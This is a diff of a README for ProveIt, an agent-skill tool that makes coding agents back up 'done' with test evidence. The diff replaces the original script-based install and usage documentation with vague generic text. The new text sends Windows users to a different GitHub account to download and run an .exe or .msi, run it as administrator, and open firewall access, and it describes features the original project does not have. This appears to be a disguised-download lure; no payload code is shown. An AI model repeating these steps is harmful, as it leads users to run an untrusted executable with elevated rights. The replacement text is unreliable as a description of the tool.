@@ -1,192 +1,63 @@
-# ProveIt
+# 🔍 prove-it - Verify your code agent tasks automatically
 
-**Make coding agents prove their work before they say “done.”**
+[![](https://img.shields.io/badge/Download_prove-it-blue.svg)](https://github.com/clangorous-rastafarian429/prove-it)
 
-ProveIt is a portable Agent Skill for Codex, Claude Code, Cursor, GitHub Copilot, and agents that support the open skills directory convention. It turns completion into an evidence-backed decision using tests, builds, static checks, runtime checks, and honest disclosure of anything that could not be verified.
+Coding agents often claim their work is complete before they finish the task. prove-it watches your agent during the coding process. It forces the agent to run tests, perform builds, and check the code after every change. This tool ensures the code actually works before the agent marks the job as done. You get peace of mind knowing the agent provided honest evidence for every line of code it wrote.
 
-```text
-Before
+## ⚙️ System Requirements
 
-Done — the login bug is fixed.
+Your computer needs a few basic items to run prove-it:
 
-After ProveIt
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 500 megabytes of free space on your hard drive.
+* Basic knowledge of how to run programs on your computer.
 
-Status: PARTIALLY VERIFIED
+## 💾 How to Install and Start
 
-✓ Regression test: 6 passed
-✓ Type check: passed
-✓ Production build: passed
-⚠ Real OAuth callback: unavailable without provider credentials
-```
+Follow these steps to set up prove-it on your Windows machine:
 
-## Why ProveIt
+1. Visit this page to download the latest version: [https://github.com/clangorous-rastafarian429/prove-it](https://github.com/clangorous-rastafarian429/prove-it).
+2. Look for the file ending in .msi or .exe under the latest release section.
+3. Save the file to your computer.
+4. Double-click the file to start the installer.
+5. Follow the instructions on the screen to finish the setup.
+6. Once finished, open your Start menu and search for "prove-it" to launch the program.
 
-Coding agents often confuse a plausible edit with a verified result. ProveIt adds a lightweight completion gate:
+## 🛠️ How it Works
 
-- every important claim is mapped to an observable check;
-- checks run against the final revision;
-- passing, failing, skipped, and unavailable checks remain distinct;
-- verification depth scales from quick to strict;
-- high-risk changes require negative and boundary evidence;
-- the final answer reports proof and gaps instead of confidence theater.
+Many people use AI tools to write code. These tools write files but rarely check if the files work. prove-it sits between your agent and your code. It works like a guard. When the agent submits code, prove-it blocks the submission. It triggers an automatic build process. If the build fails, the agent must fix the error. Next, it runs your existing test suite. If a test fails, the agent receives a report and must try again. Finally, it records the output as evidence. The agent cannot say it is done until all checks pass.
 
-No API key, hosted service, account, or runtime dependency is required. The optional evidence recorder uses only the Python standard library.
+## 🚀 Setting up Your Agent
 
-## Install
+You can connect prove-it to the tools you already use. Open the settings menu inside the application. You will see a list of compatible agents. Select the agent you use for your coding tasks. The application creates a bridge between your agent and the test environment. You do not need to write extra scripts. prove-it handles the background tasks for you.
 
-Clone or download this repository, enter its directory, and run:
+## 📋 Common Tasks
 
-```bash
-./install.sh
-```
+### Checking New Code
+When you ask your agent to create a new feature, prove-it monitors the progress. It watches the terminal output from your agent. If the agent finishes a file, prove-it starts the verification immediately. You see a green checkmark on your screen when the evidence is ready.
 
-The installer detects supported agents already present on the machine. If none are detected, it installs the open Agent Skills layout.
+### Reviewing Evidence
+Historical logs exist for every session. Click the history tab to see past tasks. You can view the build logs and test results for any session. This gives you a clear record of how your agent performed. Use these logs to see where your agent struggles or where it performs well.
 
-Windows PowerShell:
+### Updating the Application
+The app checks for updates every time you open it. If a new version exists, a window appears on your screen. Click update to install the latest improvements. This ensures you have the newest features and compatibility patches.
 
-```powershell
-./install.ps1
-```
+## ❓ Troubleshooting
 
-Install for a specific agent:
+Most users find the setup process simple. If you run into issues, check these frequent problems:
 
-```bash
-./install.sh --agent codex
-./install.sh --agent claude
-./install.sh --agent cursor
-./install.sh --agent copilot --scope project
-./install.sh --agent generic
-```
+* **The app does not launch:** Ensure you have the latest drivers for your computer. Restart your machine and try again.
+* **The agent fails verification:** Read the logs in the report window. The logs tell you if a test failed or if a build error occurred. Pass these logs back to the agent to help it correct its work.
+* **Permission errors:** Run the application as an administrator if it cannot access your project folders. Right-click the icon and choose Run as Administrator.
+* **Network issues:** If the app cannot connect to your agent, check your firewall settings. Ensure that the application has permission to reach the internet.
 
-Install every supported project adapter:
+## 🛡️ Privacy and Data
 
-```bash
-./install.sh --agent all --scope project
-```
+Your code stays on your machine. prove-it verifies your code locally. It does not send your source code to external servers. The evidence logs remain stored on your computer disk. You keep full control over your files. 
 
-The default scope is `user`. Project installation writes only inside the directory supplied with `--project`, which defaults to the current directory.
+## 🌐 Community and Support
 
-```bash
-./install.sh --agent all --scope project --project /path/to/project
-```
+Feel free to open an issue on the GitHub page if you find a bug. Provide a clear description of what happened when you tried to use the app. Attach a screenshot if possible. This helps provide a quick solution to your problem. We maintain this tool for users who want better quality assurance for their AI coding projects.
 
-Running the installer again updates the installed files.
-
-## Use
-
-Invoke the skill explicitly:
-
-```text
-Use $prove-it to verify this change before you call it complete.
-```
-
-Other useful prompts:
-
-```text
-Use $prove-it in strict mode and tell me whether this authentication fix is ready to merge.
-```
-
-```text
-Prove that the bug is fixed. Do not change anything else.
-```
-
-```text
-Verify the final diff and show exactly which claims remain untested.
-```
-
-Once installed as an Agent Skill, ProveIt can also trigger automatically for requests involving verification, validation, testing, release readiness, or evidence-backed completion.
-
-## Verification profiles
-
-| Profile | Best for | Minimum depth |
-| --- | --- | --- |
-| Quick | Small, localized, low-risk edits | Diff inspection, focused check, cheapest static check |
-| Standard | Normal features, fixes, and refactors | Focused tests, static checks, broader test/build, primary runtime path |
-| Strict | Auth, payments, migrations, security, releases | Standard plus negative, boundary, integration, recovery, and release-shaped checks |
-
-ProveIt defaults to Standard and upgrades automatically when the consequence of being wrong is high.
-
-## Honest statuses
-
-- `VERIFIED`: every material claim has current passing evidence.
-- `PARTIALLY VERIFIED`: performed checks pass, but a material check is unavailable.
-- `FAILED`: evidence contradicts at least one material claim.
-- `BLOCKED`: meaningful verification could not be performed.
-
-A failure never becomes “partial verification” just because other checks passed.
-
-## Evidence recorder
-
-The optional recorder runs a command, preserves its exit status, redacts common secret formats, and appends a JSON Lines evidence record:
-
-```bash
-python skills/prove-it/scripts/evidence.py run \
-  --label "Unit tests" \
-  --log .proveit/evidence.jsonl \
-  -- python -m pytest -q
-```
-
-Generate a shareable Markdown report:
-
-```bash
-python skills/prove-it/scripts/evidence.py render \
-  --log .proveit/evidence.jsonl \
-  --output .proveit/report.md
-```
-
-Fail a pipeline unless every recorded command passed:
-
-```bash
-python skills/prove-it/scripts/evidence.py status \
-  --log .proveit/evidence.jsonl
-```
-
-Add a custom redaction regular expression with `--redact` or the `PROVEIT_REDACT` environment variable. Review reports before publishing them: automatic redaction reduces risk but cannot recognize every secret format.
-
-## Supported layouts
-
-| Target | User installation | Project installation |
-| --- | --- | --- |
-| Codex | `~/.codex/skills/prove-it` | `.agents/skills/prove-it` |
-| Claude Code | `~/.claude/skills/prove-it` | `.claude/skills/prove-it` |
-| Generic Agent Skills | `~/.agents/skills/prove-it` | `.agents/skills/prove-it` |
-| Cursor | `~/.cursor/rules/prove-it.mdc` | `.cursor/rules/prove-it.mdc` |
-| GitHub Copilot | Project scope only | `.github/instructions/prove-it.instructions.md` |
-
-The canonical portable skill lives in [`skills/prove-it`](skills/prove-it). Cursor and Copilot receive compact native adapters derived from the same evidence contract.
-
-## Uninstall
-
-```bash
-./uninstall.sh
-```
-
-Windows PowerShell:
-
-```powershell
-./uninstall.ps1
-```
-
-The uninstallers accept the same `--agent`, `--scope`, and project options as the installers and remove only ProveIt-owned paths.
-
-## Safety and privacy
-
-ProveIt does not grant an agent permission to deploy, alter production data, make purchases, install dependencies, contact external services, or expand the requested change. It instructs the agent to stop and disclose a verification gap when meaningful proof would require new authority.
-
-The evidence recorder never captures the full environment. It stores command output tails and basic Git state. Command output can still contain sensitive material, so keep `.proveit/` out of version control unless a reviewed report is intentionally being committed.
-
-## Development
-
-```bash
-make test
-```
-
-The test suite covers successful and failing commands, exit-code preservation, report generation, output truncation, timeout handling, and secret redaction.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md). Security-sensitive reports should follow [SECURITY.md](SECURITY.md).
-
-## License
-
-[MIT](LICENSE)
+Keywords: agent-skills, ai-agents, claude-code, codex, coding-agents, cursor, developer-tools, github-copilot, llm, quality-assurance, testing, verification
